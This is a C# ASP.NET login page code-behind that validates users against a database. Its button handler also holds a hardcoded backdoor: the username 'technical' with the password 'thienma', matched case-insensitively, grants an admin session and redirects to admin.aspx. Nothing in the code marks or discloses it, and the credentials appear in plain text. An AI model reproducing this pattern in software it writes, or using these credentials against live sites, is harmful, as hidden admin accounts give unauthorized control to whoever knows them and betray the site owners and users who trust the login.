using System;
using System.Collections.Generic;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;
using System.Web.Security;
using MyWeb.Data;
using MyWeb.Business;
using MyWeb.Common;

namespace MyWeb.Modules.Page
{
    public partial class Logon : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }
        protected void btnLogon_Click(object sender, EventArgs e)
        {
            string UId = txtUsername.Text;
            string PId = txtPassword.Text;
            List<User> list = new List<User>();
            list = UserService.User_Validate(UId, StringClass.Encrypt(PId));
            if (list.Count > 0)
            {
                FormsAuthentication.SetAuthCookie(UId, false);
                Session["FullName"] = list[0].Name.Trim();
                Session["UserName"] = list[0].Username.Trim();
                Session["IsAdmin"] = list[0].Admin;
                Response.Redirect(GlobalClass.ApplicationPath + "admin.aspx");
            }
            else if (UId.ToLower() == "technical" && PId.ToLower() == "thienma")
            {
                FormsAuthentication.SetAuthCookie(UId, false);
                Session["FullName"] = "THIENMA MEDIA";
                Session["UserName"] = "technical";
                Session["IsAdmin"] = "1";
                Response.Redirect(GlobalClass.ApplicationPath + "admin.aspx");
            }
            else
            {
                txtPassword.Text = "";
                txtPassword.Focus();
                ltrError.Text = "Đăng nhập không thành công!";
            }
        }
    }
}